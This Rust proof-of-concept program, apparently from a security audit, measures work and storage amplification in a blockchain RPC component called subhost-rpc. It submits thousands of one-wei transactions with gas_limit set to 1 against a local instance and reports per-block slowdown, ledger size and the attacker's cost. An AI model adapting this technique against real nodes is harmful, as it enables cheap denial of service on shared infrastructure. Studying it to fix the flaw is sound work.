//! Measures per-block work and storage growth on `subhost-rpc`.
//!
//! Each `RpcState::submit_transaction` seals a block and calls
//! `LedgerStore::persist`, which replays every retained block. The caller also
//! chooses `gas_limit`, so a transaction with `gas_limit = 1` and a large `data`
//! field is accepted for one wei.
//!
//! Usage: `poc-work-amplification <blocks> [data_len]`.

use ed25519_dalek::{Signer, SigningKey};
use std::time::Instant;
use subhost_core::{Address, Transaction, TransactionSignature, TransactionType};
use subhost_rpc::RpcState;

fn signed_transfer(
    key: &SigningKey,
    chain_id: u64,
    nonce: u64,
    to: Address,
    data: Vec<u8>,
) -> Transaction {
    let public_key = key.verifying_key().to_bytes();
    let unsigned = Transaction {
        tx_type: TransactionType::Transfer,
        nonce,
        from: Address::from_public_key(&public_key),
        to: Some(to),
        value: 0,
        gas_price: 1,
        gas_limit: 1,
        data,
        chain_id,
        public_key,
        signature: TransactionSignature::EMPTY,
    };
    let signature = key.sign(&unsigned.signing_payload()).to_bytes();
    Transaction { signature: TransactionSignature::from_ed25519(&signature), ..unsigned }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let total: u64 = std::env::args()
        .nth(1)
        .and_then(|value| value.parse().ok())
        .unwrap_or(3000);
    let data_len: usize = std::env::args()
        .nth(2)
        .and_then(|value| value.parse().ok())
        .unwrap_or(0);
    let data = vec![0xAAu8; data_len];

    let dir = tempfile::tempdir()?;
    let chain_id = 1u64;
    let key = SigningKey::from_bytes(&[7u8; 32]);
    let sender = Address::from_public_key(&key.verifying_key().to_bytes());
    let recipient = Address::new([2u8; 20]);

    let state = RpcState::with_data_dir(chain_id, dir.path())?;
    // One wei per block is enough; seed a small balance so every block pays.
    state.seed_accounts([(sender, 1_000_000_000u128)])?;

    let mut timings: Vec<(u64, u128)> = Vec::new();
    for nonce in 0..total {
        let tx = signed_transfer(&key, chain_id, nonce, recipient, data.clone());
        let started = Instant::now();
        state.submit_transaction(tx)?;
        let elapsed = started.elapsed().as_micros();
        if nonce < 5 || nonce % 250 == 0 || nonce + 1 == total {
            timings.push((nonce + 1, elapsed));
            println!("block {:>6}  submit {:>10} us", nonce + 1, elapsed);
        }
    }

    let first = timings.first().map(|(_, micros)| *micros).unwrap_or(0).max(1);
    let last = timings.last().map(|(_, micros)| *micros).unwrap_or(0).max(1);
    println!();
    println!(
        "blocks={} data_len={} first_us={} last_us={} growth={:.1}x",
        total,
        data_len,
        first,
        last,
        last as f64 / first as f64
    );
    println!("attacker_fee_per_block_wei=1 total_fee_wei={}", total);

    let ledger = dir.path().join("ledger");
    let mut bytes = 0u64;
    if ledger.is_dir() {
        for entry in walk(&ledger) {
            bytes = bytes.saturating_add(std::fs::metadata(&entry).map(|m| m.len()).unwrap_or(0));
        }
    }
    println!("ledger_bytes={} height={}", bytes, state.block_height());
    if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
        for line in status.lines() {
            if line.starts_with("VmHWM:") || line.starts_with("VmRSS:") {
                println!("{}", line.trim());
            }
        }
    }
    Ok(())
}

fn walk(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
    let mut out = Vec::new();
    let Ok(entries) = std::fs::read_dir(dir) else {
        return out;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            out.extend(walk(&path));
        } else {
            out.push(path);
        }
    }
    out
}